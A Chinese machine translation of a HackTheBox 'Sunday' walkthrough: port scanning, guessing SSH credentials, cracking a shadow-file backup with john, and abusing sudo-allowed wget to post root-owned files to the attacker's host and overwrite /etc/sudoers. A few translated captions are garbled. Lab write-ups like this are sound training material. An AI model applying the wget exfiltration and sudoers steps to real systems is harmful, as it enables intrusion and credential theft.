<html>
<head>
<title>Sunday — A Wget Privilege Escalation HackTheBox Walkthrough</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">周日Wget权限提升黑客盒子演练</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/sunday-a-wget-privilege-escalation-hackthebox-walkthrough-899e02f86819?source=collection_archive---------0-----------------------#2018-10-02">https://infosecwriteups.com/sunday-a-wget-privilege-escalation-hackthebox-walkthrough-899e02f86819?source=collection_archive---------0-----------------------#2018-10-02</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/1baa30432fb7e7ea6f1f3979c49249f0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RiLM5YhhENhbZAKiu8pf0w.png"/></div></div></figure><h1 id="0a2a" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">摘要</h1><p id="daa2" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">Sunday是一台运行SSH服务器的Linux主机，用户凭证较弱。这被用来访问机器并恢复<code class="fe lu lv lw lx b">/etc/shadow</code>文件的备份。该备份文件用于破解一个帐户的密码哈希，该帐户能够以提升的权限访问<code class="fe lu lv lw lx b">wget</code>文件。这被用来破解根标志并获得系统上的根外壳。</p><h1 id="3b96" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">侦察</h1><p id="db78" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">我开始对这台主机进行侦察，用<code class="fe lu lv lw lx b">nmap</code>扫描检查服务版本，并在前1000个最常见的端口上运行默认脚本:</p><pre class="ly lz ma mb gt mc lx md me aw mf bi"><span id="0bd8" class="mg jz iq lx b gy mh mi l mj mk">nmap -sV -sC 10.10.10.76</span></pre><figure class="ly lz ma mb gt jr"><div class="bz fp l di"><div class="ml mm l"/></div><figcaption class="mn mo gj gh gi mp mq bd b be z dk translated">就这样？</figcaption></figure><p id="d8e4" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">这并没有返回太多的工作，所以我转向UDP，看看是否有什么可以找到。</p><pre class="ly lz ma mb gt mc lx md me aw mf bi"><span id="2f2f" class="mg jz iq lx b gy mh mi l mj mk">nmap -sU 10.10.10.76</span></pre><figure class="ly lz ma mb gt jr"><div class="bz fp l di"><div class="ml mm l"/></div><figcaption class="mn mo gj gh gi mp mq bd b be z dk translated">好吧…</figcaption></figure><p id="afab" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">在这一点上，我仍然觉得缺少了一些东西，所以我使用<code class="fe lu lv lw lx b">nmap</code>运行了一个快速的全端口扫描，并使用一些参数来提高扫描的速度:</p><pre class="ly lz ma mb gt mc lx md me aw mf bi"><span id="4e78" class="mg jz iq lx b gy mh mi l mj mk">nmap -sT --min-rate 5000 --max-retries 1 -p- 10.10.10.76</span></pre><blockquote class="mw mx my"><p id="e226" class="kw kx mz ky b kz mr lb lc ld ms lf lg na mt lj lk nb mu ln lo nc mv lr ls lt ij bi translated"><code class="fe lu lv lw lx b"><em class="iq">-sT</em></code> — TCP连接扫描<br/> <code class="fe lu lv lw lx b"><em class="iq">--min-rate</em></code> —使nmap尝试将发送速率保持在或高于指定的每秒数据包数(本例中为每秒5000个数据包)<br/> <code class="fe lu lv lw lx b"><em class="iq">--max-retries</em></code> —限制重新传输次数<br/> <code class="fe lu lv lw lx b"><em class="iq">-p-</em></code> —扫描所有端口；1到65535</p></blockquote><figure class="ly lz ma mb gt jr"><div class="bz fp l di"><div class="ml mm l"/></div><figcaption class="mn mo gj gh gi mp mq bd b be z dk translated">nmap -p-</figcaption></figure><p id="3853" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">这是一种非常快速且非常嘈杂的扫描，根据网络连接的速度和各种其他因素，它肯定会错过打开的端口，因此请谨慎使用并保持适度的怀疑。</p><p id="d63d" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">在这次扫描之后，我又进行了一次扫描，以枚举服务版本并在其他开放端口上运行默认脚本:</p><pre class="ly lz ma mb gt mc lx md me aw mf bi"><span id="e791" class="mg jz iq lx b gy mh mi l mj mk">nmap -sV -sC -p22022,34994,53936 10.10.10.76</span></pre><figure class="ly lz ma mb gt jr"><div class="bz fp l di"><div class="ml mm l"/></div><figcaption class="mn mo gj gh gi mp mq bd b be z dk translated">纳米粒子加速器</figcaption></figure><p id="0c36" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">有意思！这返回了在主机上运行的SSH。</p><h1 id="f8fd" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">最初的立足点</h1><p id="95d9" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">我承认这一点导致了这个盒子中最令人沮丧的部分。按照真正的CTF方式，用户名和密码应该是猜出来的。我不太喜欢这种挑战。我尝试使用<code class="fe lu lv lw lx b">auxiliary(scanner/ssh/ssh_enumusers)</code> Metasploit模块和<a class="ae nd" href="https://blog.rootshell.be/2018/08/16/detecting-ssh-username-enumeration/" rel="noopener ugc nofollow" target="_blank"> OpenSSH用户枚举测试</a>，以防服务被错误地指纹化为SunSSH。这些测试的假阳性率很高，我不得不猜测。</p><p id="1dfe" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">论坛上的提示是，我们需要知道的只是主机名，我们可以猜测用户。在对“Sunday”进行多次排列后，我能够猜出密码为<code class="fe lu lv lw lx b">sunday</code>的用户<code class="fe lu lv lw lx b">sunny</code>。离理想很远，但现在我有了一个立足点。</p><h1 id="81f8" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">本地枚举</h1><p id="38f0" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">我在<code class="fe lu lv lw lx b">/backup/shadow.backup</code>恢复了一个文件。该文件包含10个用户，但只有2个哈希；一个给<code class="fe lu lv lw lx b">sunny</code>，另一个给用户<code class="fe lu lv lw lx b">sammy</code>。我把这个文件传输回我的机器，用<code class="fe lu lv lw lx b">john</code>破解了<code class="fe lu lv lw lx b">sammy</code>的哈希:</p><pre class="ly lz ma mb gt mc lx md me aw mf bi"><span id="879a" class="mg jz iq lx b gy mh mi l mj mk">john shadow.backup --wordlist=/usr/share/wordlists/rockyou.txt</span></pre><p id="be81" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">以<code class="fe lu lv lw lx b">sammy</code>的身份回到机器，我运行<code class="fe lu lv lw lx b">sudo -l</code>来查看这个用户能够以提升的权限执行什么。这就是事情变得有趣的地方。</p><h1 id="0cb8" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">权限提升</h1><p id="934f" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">用户<code class="fe lu lv lw lx b">sammy</code>能够以提升的权限执行<code class="fe lu lv lw lx b">wget</code>。这个命令通常与下载远程文件相关联——这是正确的；它的手册页名为“Wget —非交互式网络下载器”</p><p id="ea16" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">在这个实例中，<code class="fe lu lv lw lx b">wget</code>的有趣之处在于它也可以用来发送文件。我能够使用以下命令从主机中提取根标志:</p><pre class="ly lz ma mb gt mc lx md me aw mf bi"><span id="eaab" class="mg jz iq lx b gy mh mi l mj mk">sudo wget --post-file=/root/root.txt 10.10.14.12</span></pre><p id="ee78" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">在我的本地机器上，我只是使用<code class="fe lu lv lw lx b">ncat</code>监听连接:</p><pre class="ly lz ma mb gt mc lx md me aw mf bi"><span id="fccc" class="mg jz iq lx b gy mh mi l mj mk">ncat -lvnp 80</span></pre><p id="e8aa" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">这也有助于过滤其他敏感文件，如<code class="fe lu lv lw lx b">/etc/shadow</code>来转储散列。</p><p id="1ee1" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">我更喜欢这种方法，因为它简单，对主机的影响小。还有其他方法让HTB用户把他们自己的<code class="fe lu lv lw lx b">/etc/shadow</code>文件和<code class="fe lu lv lw lx b">/etc/passwd</code>文件放在主机上，但是这些方法对使用同一盒子的其他玩家有负面影响。事实上，我第一次以<code class="fe lu lv lw lx b">sunny</code>的身份访问机器时，权限被搞砸了，我可以以root用户身份运行任何命令，而无需密码……不用说，我必须稍后回来，并在与其他一些以“正确”方式完成此操作的人交谈后，弄清楚我应该如何得到这个盒子！</p><h2 id="75cc" class="mg jz iq bd ka ne nf dn ke ng nh dp ki lh ni nj km ll nk nl kq lp nm nn ku no bi translated">根壳</h2><p id="9b7b" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">我发现使用<code class="fe lu lv lw lx b">wget</code>获得根shell的最好方法是将<code class="fe lu lv lw lx b">/etc/sudoers</code>文件发送到我的机器上，只编辑<em class="mz">和</em>用户的权限，以便使用提升的权限运行命令。然后，我使用<code class="fe lu lv lw lx b">wget</code>将文件下载回Sunday，并获得了一个根shell。</p><figure class="ly lz ma mb gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi np"><img src="../Images/d51bf52bae457016bc49c0c243350070.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6Fx8hObeFZtGLwGRY120kw.png"/></div></div><figcaption class="mn mo gj gh gi mp mq bd b be z dk translated">我是root</figcaption></figure></div></div>    
</body>
</html>